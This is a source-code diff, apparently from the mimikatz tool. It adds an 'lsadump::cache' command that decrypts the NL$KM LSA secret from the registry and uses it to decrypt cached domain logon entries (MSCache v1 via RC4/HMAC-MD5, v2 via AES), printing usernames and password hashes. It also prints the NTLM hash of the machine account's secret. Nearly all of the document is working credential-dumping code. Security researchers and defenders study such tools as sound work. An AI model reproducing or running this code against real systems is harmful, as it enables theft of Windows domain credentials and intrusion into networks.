@@ -8,6 +8,7 @@
 const KUHL_M_C kuhl_m_c_lsadump[] = {
 	{kuhl_m_lsadump_sam,	L"sam",			L"Get the SysKey to decrypt SAM entries (from registry or hives)"},
 	{kuhl_m_lsadump_secrets,L"secrets",		L"Get the SysKey to decrypt SECRETS entries (from registry or hives)"},
+	{kuhl_m_lsadump_cache,	L"cache",		L"Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives)"},
 	{kuhl_m_lsadump_samrpc,	L"samrpc",		L"Ask SAM Service to retrieve SAM entries (patch on the fly)"},
 };
 
@@ -77,6 +78,16 @@ NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
 
 NTSTATUS kuhl_m_lsadump_secrets(int argc, wchar_t * argv[])
 {
+	return kuhl_m_lsadump_secretsOrCache(argc, argv, TRUE);
+}
+
+NTSTATUS kuhl_m_lsadump_cache(int argc, wchar_t * argv[])
+{
+	return kuhl_m_lsadump_secretsOrCache(argc, argv, FALSE);
+}
+
+NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsOrCache)
+{
 	HANDLE hDataSystem, hDataSecurity;
 	PKULL_M_REGISTRY_HANDLE hSystem, hSecurity;
 	HKEY hSystemBase, hSecurityBase;
@@ -99,7 +110,7 @@ NTSTATUS kuhl_m_lsadump_secrets(int argc, wchar_t * argv[])
 						{
 							if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSecurity, &hSecurity))
 							{
-								kuhl_m_lsadump_getLsaKeyAndSecrets(hSecurity, NULL, hSystem, NULL, sysKey);
+								kuhl_m_lsadump_getLsaKeyAndSecrets(hSecurity, NULL, hSystem, NULL, sysKey, secretsOrCache);
 								kull_m_registry_close(hSecurity);
 							}
 							CloseHandle(hDataSecurity);
@@ -121,7 +132,7 @@ NTSTATUS kuhl_m_lsadump_secrets(int argc, wchar_t * argv[])
 				{
 					if(kull_m_registry_RegOpenKeyEx(hSystem, HKEY_LOCAL_MACHINE, L"SECURITY", 0, KEY_READ, &hSecurityBase))
 					{
-						kuhl_m_lsadump_getLsaKeyAndSecrets(hSystem, hSecurityBase, hSystem, hSystemBase, sysKey);
+						kuhl_m_lsadump_getLsaKeyAndSecrets(hSystem, hSecurityBase, hSystem, hSystemBase, sysKey, secretsOrCache);
 						kull_m_registry_RegCloseKey(hSystem, hSecurityBase);
 					}
 					else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx (SECURITY)");
@@ -372,7 +383,7 @@ BOOL kuhl_m_lsadump_getSamKey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hAccount, 
 	return status;
 }
 
-BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecurityBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN LPBYTE sysKey)
+BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecurityBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN LPBYTE sysKey, IN BOOL secretsOrCache)
 {
 	BOOL status = FALSE;
 	HKEY hPolicy, hPolRev, hEncKey;
@@ -447,7 +458,12 @@ BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN
 		}
 
 		if(nt6keysStream || nt5key)
-			kuhl_m_lsadump_getSecrets(hSecurity, hPolicy, hSystem, hSystemBase, nt6keysStream, nt5key);
+    {
+			if(secretsOrCache)
+				kuhl_m_lsadump_getSecrets(hSecurity, hPolicy, hSystem, hSystemBase, nt6keysStream, nt5key);
+			else
+				kuhl_m_lsadump_getNLKMSecretAndCache(hSecurity, hPolicy, hSecurityBase, nt6keysStream, nt5key);
+    }
 
 		kull_m_registry_RegCloseKey(hSecurity, hPolicy);
 	}
@@ -464,7 +480,9 @@ BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPo
 {
 	BOOL status = FALSE;
 	HKEY hSecrets, hSecret, hValue, hCurrentControlSet, hServiceBase;
-	DWORD i, nbSubKeys, szMaxSubKeyLen, szSecretName;
+	DWORD i, nbSubKeys, szMaxSubKeyLen, szSecretName, szSecret;
+	PVOID pSecret;
+	MD4_CTX ctx;
 	wchar_t * secretName;
 
 	if(kull_m_registry_RegOpenKeyEx(hSecurity, hPolicyBase, L"Secrets", 0, KEY_READ, &hSecrets))
@@ -492,12 +510,28 @@ BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPo
 								{
 									if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecret, L"CurrVal", 0, KEY_READ, &hValue))
 									{
-										kuhl_m_lsadump_decryptSecret(hSecurity, hValue, L"\ncur/", lsaKeysStream, lsaKeyUnique);
+										if(kuhl_m_lsadump_decryptSecret(hSecurity, hValue, lsaKeysStream, lsaKeyUnique, &pSecret, &szSecret))
+										{
+											if(_wcsicmp(secretName, L"$MACHINE.ACC") == 0)
+											{
+												kprintf(L"\n**NTLM**: ");
+												MD4Init(&ctx);
+												MD4Update(&ctx, (LPCBYTE) pSecret, szSecret);
+												MD4Final(&ctx);
+												kull_m_string_wprintf_hex(ctx.digest, MD4_DIGEST_LENGTH, 0);
+											}
+											kuhl_m_lsadump_candidateSecret(szSecret, pSecret, L"\ncur/");
+											LocalFree(pSecret);
+										}
 										kull_m_registry_RegCloseKey(hSecurity, hValue);
 									}
 									if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecret, L"OldVal", 0, KEY_READ, &hValue))
 									{
-										kuhl_m_lsadump_decryptSecret(hSecurity, hValue, L"\nold/", lsaKeysStream, lsaKeyUnique);
+										if(kuhl_m_lsadump_decryptSecret(hSecurity, hValue, lsaKeysStream, lsaKeyUnique, &pSecret, &szSecret))
+										{
+											kuhl_m_lsadump_candidateSecret(szSecret, pSecret, L"\nold/");
+											LocalFree(pSecret);
+										}
 										kull_m_registry_RegCloseKey(hSecurity, hValue);
 									}
 									kull_m_registry_RegCloseKey(hSecurity, hSecret);
@@ -515,6 +549,119 @@ BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPo
 		kull_m_registry_RegCloseKey(hSecurity, hSecrets);
 	}
 	return status;
+}
+
+BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN HKEY hSecurityBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique)
+{
+	BOOL status = FALSE;
+	HKEY hValue, hCache;
+	DWORD i, j, szNLKM, nbValues, szMaxValueNameLen, szMaxValueLen, szSecretName, szSecret, szNeeded;
+	PVOID pNLKM;
+	wchar_t * secretName;
+	PMSCACHE_ENTRY pMsCacheEntry;
+	PBYTE pMsCacheData;
+	HCRYPTPROV hContext;
+	HCRYPTKEY hKey;
+	AES_128_KEY_BLOB keyBlob = {{PLAINTEXTKEYBLOB, CUR_BLOB_VERSION, 0, CALG_AES_128}, AES_128_KEY_SIZE};
+	DWORD s1;
+	NTSTATUS nStatus;
+	BYTE digest[MD5_DIGEST_LENGTH];
+	CRYPTO_BUFFER data, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, digest};
+
+	if(kull_m_registry_RegOpenKeyEx(hSecurity, hPolicyBase, L"Secrets\\NL$KM\\CurrVal", 0, KEY_READ, &hValue))
+	{
+		if(kuhl_m_lsadump_decryptSecret(hSecurity, hValue, lsaKeysStream, lsaKeyUnique, &pNLKM, &szNLKM))
+		{
+			if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecurityBase, L"Cache", 0, KEY_READ, &hCache))
+			{
+				if(kull_m_registry_RegQueryInfoKey(hSecurity, hCache, NULL, NULL, NULL, NULL, NULL, NULL, &nbValues, &szMaxValueNameLen, &szMaxValueLen, NULL, NULL))
+				{
+					szMaxValueNameLen++;
+					if(secretName = (wchar_t *) LocalAlloc(LPTR, (szMaxValueNameLen + 1) * sizeof(wchar_t)))
+					{
+						if(pMsCacheEntry = (PMSCACHE_ENTRY) LocalAlloc(LPTR, szMaxValueLen))
+						{
+							for(i = 0; i < nbValues; i++)
+							{
+								szSecretName = szMaxValueNameLen;
+								szSecret = szMaxValueLen;
+								if(kull_m_registry_RegEnumValue(hSecurity, hCache, i, secretName, &szSecretName, NULL, NULL, (LPBYTE) pMsCacheEntry, &szSecret))
+								{
+									if((_wcsnicmp(secretName, L"NL$Control", 10) == 0) || !(pMsCacheEntry->flags & 1))
+										continue;
+
+									pMsCacheData = (PBYTE) pMsCacheEntry->enc_data;
+
+									kprintf(L"\n[%s - ", secretName);
+									kull_m_string_displayLocalFileTime(&pMsCacheEntry->lastWrite);
+									kprintf(L"]\nRID       : %08x (%u)\n", pMsCacheEntry->userId, pMsCacheEntry->userId);
+
+									if(lsaKeysStream) // NT 6
+									{
+										RtlCopyMemory(keyBlob.key, pNLKM, AES_128_KEY_SIZE);
+										if(CryptAcquireContext(&hContext, NULL, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_2K3) ? MS_ENH_RSA_AES_PROV_XP : MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+										{
+											if(CryptImportKey(hContext, (LPBYTE) &keyBlob, sizeof(AES_128_KEY_BLOB), 0, 0, &hKey))
+											{
+												if(status = CryptSetKeyParam(hKey, KP_IV, pMsCacheEntry->iv, 0))
+												{
+													s1 = sizeof(MSCACHE_DATA) + pMsCacheEntry->szUserName + 2 * ((pMsCacheEntry->szUserName / sizeof(wchar_t)) % 2) + pMsCacheEntry->szDomainName;
+													s1 += s1 % AES_BLOCK_SIZE;
+
+													if(s1 <= szSecret - FIELD_OFFSET(MSCACHE_ENTRY, enc_data))
+													{
+														for(j = 0; status && (j < s1); j+= AES_BLOCK_SIZE)
+														{
+															szNeeded = AES_BLOCK_SIZE;
+															status = CryptDecrypt(hKey, 0, FALSE, 0, pMsCacheEntry->enc_data + j, &szNeeded);
+														}
+
+														if(status)
+															kuhl_m_lsadump_printMsCache(pMsCacheEntry, '2');
+														else PRINT_ERROR_AUTO(L"CryptDecrypt");
+													}
+												}
+												else PRINT_ERROR_AUTO(L"CryptSetKeyParam");
+												CryptDestroyKey(hKey);
+											}
+											else PRINT_ERROR_AUTO(L"CryptImportKey");
+											CryptReleaseContext(hContext, 0);
+										}
+									}
+									else // NT 5
+									{
+										kuhl_m_lsadump_hmac_md5(pNLKM, szNLKM, pMsCacheEntry->iv, LAZY_NT5_IV_SIZE, digest);
+										data.Length = data.MaximumLength = szSecret - FIELD_OFFSET(MSCACHE_ENTRY, enc_data);
+										data.Buffer = pMsCacheEntry->enc_data;
+										nStatus = RtlEncryptDecryptRC4(&data, &key);
+										if(NT_SUCCESS(nStatus))
+											kuhl_m_lsadump_printMsCache(pMsCacheEntry, '1');
+										else PRINT_ERROR(L"RtlEncryptDecryptRC4 : 0x%08x\n", nStatus);
+									}
+								}
+							}
+							LocalFree(pMsCacheEntry);
+						}
+						LocalFree(secretName);
+					}
+				}
+				kull_m_registry_RegCloseKey(hSecurity, hCache);
+			}
+			LocalFree(pNLKM);
+		}
+		kull_m_registry_RegCloseKey(hSecurity, hValue);
+	}
+
+	return TRUE;
+}
+
+void kuhl_m_lsadump_printMsCache(PMSCACHE_ENTRY entry, CHAR version)
+{
+	kprintf(L"User      : %.*s\\%.*s\n",
+		entry->szDomainName / sizeof(wchar_t), (PBYTE) entry->enc_data + sizeof(MSCACHE_DATA) + entry->szUserName + 2 * ((entry->szUserName / sizeof(wchar_t)) % 2),
+		entry->szUserName / sizeof(wchar_t), (PBYTE) entry->enc_data + sizeof(MSCACHE_DATA)
+		);
+	kprintf(L"MsCacheV%c : ", version); kull_m_string_wprintf_hex(((PMSCACHE_DATA) entry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
 }
 
 void kuhl_m_lsadump_getInfosFromServiceName(IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN PCWSTR serviceName)
@@ -537,8 +684,9 @@ void kuhl_m_lsadump_getInfosFromServiceName(IN PKULL_M_REGISTRY_HANDLE hSystem, 
 	}
 }
 
-void kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecret, IN PCWSTR prefix, IN PNT6_SYSTEM_KEYS lsaKeysStream, IN PNT5_SYSTEM_KEY lsaKeyUnique)
+BOOL kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecret, IN PNT6_SYSTEM_KEYS lsaKeysStream, IN PNT5_SYSTEM_KEY lsaKeyUnique, IN PVOID * pBufferOut, IN PDWORD pSzBufferOut)
 {
+	BOOL status = FALSE;
 	DWORD szSecret = 0;
 	PBYTE secret;
 	CRYPTO_BUFFER data, output = {0, 0, NULL}, key = {sizeof(NT5_SYSTEM_KEY), sizeof(NT5_SYSTEM_KEY), NULL};
@@ -552,7 +700,14 @@ void kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY 
 				if(lsaKeysStream)
 				{
 					if(kuhl_m_lsadump_sec_aes256((PNT6_HARD_SECRET) secret, szSecret, lsaKeysStream, NULL))
-						kuhl_m_lsadump_candidateSecret(((PNT6_HARD_SECRET) secret)->clearSecret.SecretSize, ((PNT6_HARD_SECRET) secret)->clearSecret.Secret, prefix);
+					{
+						*pSzBufferOut = ((PNT6_HARD_SECRET) secret)->clearSecret.SecretSize;
+						if(*pBufferOut = LocalAlloc(LPTR, *pSzBufferOut))
+						{
+							status = TRUE;
+							RtlCopyMemory(*pBufferOut, ((PNT6_HARD_SECRET) secret)->clearSecret.Secret, *pSzBufferOut);
+						}
+					}
 				}
 				else if(lsaKeyUnique)
 				{
@@ -566,7 +721,14 @@ void kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY 
 						{
 							output.MaximumLength = output.Length;
 							if(NT_SUCCESS(RtlDecryptDESblocksECB(&data, &key, &output)))
-								kuhl_m_lsadump_candidateSecret(output.Length, output.Buffer, prefix);
+							{
+								*pSzBufferOut = output.Length;
+								if(*pBufferOut = LocalAlloc(LPTR, *pSzBufferOut))
+								{
+									status = TRUE;
+									RtlCopyMemory(*pBufferOut, output.Buffer, *pSzBufferOut);
+								}
+							}
 							LocalFree(output.Buffer);
 						}
 					}
@@ -577,6 +739,8 @@ void kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY 
 		}
 	}
 	else PRINT_ERROR(L"pre - kull_m_registry_RegQueryValueEx Secret value KO\n");
+
+	return status;
 }
 
 void kuhl_m_lsadump_candidateSecret(DWORD szBytesSecrets, PVOID bufferSecret, PCWSTR prefix)
@@ -658,6 +822,33 @@ BOOL kuhl_m_lsadump_sec_aes256(PNT6_HARD_SECRET hardSecretBlob, DWORD hardSecret
 		}
 	}
 	return status;
+}
+
+void kuhl_m_lsadump_hmac_md5(LPCVOID key, DWORD szKey, LPCVOID data, DWORD szData, LPVOID output)
+{
+	MD5_CTX context;
+	BYTE buffer[MD5_DIGEST_LENGTH];
+	DWORD k_ipad[16] = {0}, k_opad[16] = {0};
+	DWORD i;
+
+	if(szKey > 64) szKey = 64;
+	RtlCopyMemory(k_ipad, key, szKey);
+	RtlCopyMemory(k_opad, key, szKey);
+	for (i = 0; i < (sizeof(k_ipad) / sizeof(DWORD)); i++)
+	{
+		k_ipad[i] ^= '6666';
+		k_opad[i] ^= '\\\\\\\\';
+	}
+	MD5Init(&context);
+	MD5Update(&context, (LPCBYTE) k_ipad, sizeof(k_ipad));
+	MD5Update(&context, (LPCBYTE) data, szData);
+	MD5Final(&context);
+	RtlCopyMemory(buffer, context.digest, MD5_DIGEST_LENGTH);
+	MD5Init(&context);
+	MD5Update(&context, (LPCBYTE) k_opad, sizeof(k_opad));
+	MD5Update(&context, buffer, sizeof(buffer));
+	MD5Final(&context);
+	RtlCopyMemory(output, context.digest, MD5_DIGEST_LENGTH);
 }
 
 #ifdef _M_X64
